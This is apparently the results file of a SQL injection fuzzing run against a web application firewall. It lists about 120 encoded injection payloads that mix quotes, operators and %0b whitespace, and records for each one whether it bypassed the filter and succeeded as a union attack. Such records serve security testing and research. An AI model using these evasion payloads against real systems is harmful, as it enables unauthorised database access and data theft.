Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0143,69.89,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0139,70.13,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0104,70.52,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.015,70.65,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0178,70.65,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.016,70.65,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.009,70.65,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.008,68.96,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.012,69.77,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0113,69.77,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0176,69.77,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0104,69.77,No,200
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0'<@=.1%0b||+,Bypassed,No,None,Unknown,0.0172,69.77,No,500
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0177,69.77,No,500
0'||%0b@<@.%0b||,Bypassed,No,None,Unknown,0.0065,69.77,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0138,69.77,No,500
0%27or+!@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0178,69.77,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0167,69.77,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0187,69.77,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0182,69.77,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.016,69.77,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0135,69.77,No,200
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0078,69.77,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0094,69.77,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0158,69.77,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0122,69.77,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0164,69.77,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.011,69.77,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0121,69.77,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0137,69.77,No,500
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0099,69.77,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0106,69.77,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0117,69.77,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0135,69.77,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0125,69.77,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0116,69.77,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0121,69.77,No,500
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0104,69.77,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0152,69.77,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.011,69.77,No,500
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0115,69.77,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0217,69.77,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0148,69.77,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0148,69.77,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0145,69.77,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0167,69.77,No,500
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0089,70.01,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0104,70.08,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0081,70.46,No,500
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0184,70.65,No,200
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0137,70.65,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0138,70.65,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0116,70.65,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0194,70.65,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0288,70.65,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0142,69.48,No,500
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0107,69.77,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0124,69.77,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0081,69.77,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0109,69.77,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0265,69.77,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0106,69.77,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0162,69.77,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0136,69.77,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,69.77,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,69.77,No,200
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0185,69.77,No,500
0%27or+!@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0203,69.77,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0173,69.77,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0126,69.77,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0117,69.77,No,200
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,69.77,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0076,69.77,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0105,69.77,No,500
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0094,69.77,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0119,69.77,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.011,69.77,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0105,69.77,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,69.77,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0123,69.77,No,200
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,69.77,No,200
0'||+@<@.%0b||,Bypassed,No,None,Unknown,0.0113,69.77,No,500
0%27||%0b@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0092,69.77,No,200
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0113,69.77,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0095,69.77,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0103,69.77,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,69.77,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0172,69.77,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0086,69.77,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,69.77,No,200
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0137,69.77,No,500
0%27<@!=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0237,69.77,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0174,69.77,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.013,69.77,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0085,69.77,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0134,69.77,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0132,69.89,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0087,70.08,No,500
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0205,70.4,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0176,70.65,No,200
0%27||+@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0112,70.65,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,70.65,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0104,70.65,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0094,70.65,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0101,70.65,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0213,69.54,No,500
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0122,69.77,No,500
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0117,69.77,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0104,69.77,No,500
0%27or+@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0111,69.77,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0125,69.77,No,500
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0122,69.77,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0115,69.77,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.008,69.77,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0137,69.77,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,69.77,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0145,69.77,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0187,69.77,No,200
